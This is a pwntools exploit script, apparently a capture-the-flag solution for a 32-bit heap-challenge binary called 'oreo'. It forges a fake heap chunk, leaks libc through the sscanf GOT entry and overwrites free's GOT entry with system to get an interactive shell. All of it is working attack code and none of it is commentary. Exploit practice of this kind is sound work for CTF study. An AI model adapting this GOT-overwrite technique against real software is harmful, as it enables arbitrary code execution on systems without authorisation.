#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./oreo"

p = process(elf)

free_got = 0x804a238
puts_plt = 0x80484b0
sscanf_got = 0x804a258
free_off = 0x71470
system_off = 0x3ada0
bin_sh_off = 0x15b9ab
fgets_off = 0x5e150

def add(n, des):
    p.sendline("1")
    p.send(n)
    p.send(des)

def show():
    p.sendline("2")

def order():
    p.sendline("3")

def lmsg(s):
    p.sendline("4")
    p.send(s)

def status():
    p.sendline("5")


for i in range(0x40):
    add(str(i)+"\n", str(i)+"\n")

payload = p8(0)*0x1b
payload += p32(0x804a2a8)
add(payload+"\n", "40\n")

payload = p8(0)*0x24
payload += p32(0x1234)
lmsg(payload+"\n")

order()

payload = p32(0x804a288)
add("\n", payload+"\n")

#gdb.attach(p)
payload = p32(sscanf_got)
payload += p32(0)*6
payload += p32(0x41)
payload += p32(0x804a288)
lmsg(payload+"\n")

show()
p.recvuntil("Description: ")
libc_base = u32(p.recv(4).strip().ljust(4, "\x00"))-0x5c4c0
log.info("libc_base: " + hex(libc_base))

system_addr = libc_base + system_off
bin_sh_addr = libc_base + bin_sh_off
fgets_addr = libc_base + fgets_off

payload = p32(bin_sh_addr)
payload += p32(0)*6
payload += p32(0x41)
payload += p32(free_got)
lmsg(payload+"\n")

payload = p32(system_addr)
payload += p32(fgets_addr)
lmsg(payload+"\n")

gdb.attach(p)
order()

p.interactive()
